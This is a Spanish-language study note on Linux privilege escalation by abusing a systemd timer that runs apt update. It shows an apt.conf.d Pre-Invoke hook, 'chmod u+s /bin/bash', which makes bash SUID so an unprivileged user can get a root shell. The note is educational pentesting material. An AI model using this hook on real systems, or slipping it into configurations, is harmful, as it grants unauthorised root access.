-----
- Tags: #teoria #practica #escalada 
----

# Abuso de servicios internos del sistema

### Los **servicios internos**  son componentes esenciales que operan en segundo plano dentro de un sistema operativo, encargándose de funciones críticas como la gestión de red, impresión, actualización de software y monitoreo del sistema, entre otros. 

### NO obstante, si estos servicios **no están configurados adecuadamente** y se encuentran activos, pueden representar una brecha de seguridad significativa. Los atacantes podrían explotar estos servicios para obtener acceso no autorizado al sistema y llevar a cabo actividades malintencionadas. 

### Un ejemplo concreto sería un servicio de red mal configurado con permisos elevados. Si un atacante logra identificarlo y hallar una forma de aprovecharlos, podría utilizarlo para escalar privilegios y obtener acceso de administrador. 

# Escalada 

### Como sabemos cuando comprometemos una máquina puede ser que debido a reglas de firewall o configuraciones no veamos puertos abiertos a la hora de escanear los mismos, pero una vez que estamos dentro puede ser muy interesante revisar los puertos de la máquina ya que tal vez veamos resultados diferentes y podamos dar con servicios que corren que antes no podíamos ver. 

### Ejemplo: 

### Supongamos que en la ruta **/etc/systemd/system** existen dos archivos, un **apt-update.service** y un **apt-update.timer** los cuales llegamos a ver en base a ver los timers de los servios del sistema y buscar por uno el cual nos llama la atención llamado **apt-udpate.service** 

```bash
systemctl list-timers
# Fri 2023-06-02 11:38:50 EDT 18s left       Fri 2023-06-02 11:38:20 EDT 11s ago      apt-update.timer             apt-update.service

find / -name apt-update.service 2>/dev/null 
# /etc/systemd/system/apt-update.timer
# /etc/systemd/system/timers.target.wants/apt-update.timer
```

### De esta manera nos dirigimos a la ruta **/etc/systemd/system** para ver el contenido de estos archivos. 

#### apt-update.service: 
```bash
 [Unit] 
 Description=Update package list 
 
 [Service]
 Type=oneshot
 ExecStart=/usr/bin/apt update 
```

#### apt-update.timer: 
```bash
 [Unit]
 Description=Update package list every 30 seconds 
 
 [Timer]
 OnUnitActiveSec=30s 
 Unit=apt-update.service
 
 [Install]
 WantedBy=timers.target 
```

### En donde vemos que es un servicio el cual dispone de un timer para ser ejecutado cada 30s y que se encarga de ejecutar un apt-update del sistema. 

### En este punto podríamos ver si por algún motivo contamos con permisos de escritura en la carpeta **/etc/apt/apt.conf.d**, en caso de contar con permisos de escrituras podríamos automáticamente buscar como realizar una ejecución de un comando Pre-Invoke al apt, ya que podemos establecer acciones que queremos que se realicen de manera previa y posterior a una actualización del sistema. 

### Por lo que en la ruta **/etc/apt/apt.conf.d** creamos el archivo con formato como el de los demás, por ejemplo **01privesc**:

#### 01privesc: 
```bash
APT::Update::Pre-Invoke  {"chmod u+s /bin/bash";};
```

### De esta manera en base al abuso de servicios internos del sistema podríamos lograr escalar privilegios. 